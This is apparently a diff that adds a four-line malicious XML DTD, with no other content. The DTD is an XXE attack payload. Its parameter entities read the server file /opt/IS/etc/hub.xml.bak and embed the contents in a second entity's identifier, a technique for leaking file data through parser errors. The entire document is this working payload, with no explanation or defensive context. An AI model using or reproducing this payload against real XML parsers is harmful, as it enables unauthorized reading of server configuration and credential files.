@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "file:///opt/IS/etc/hub.xml.bak">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
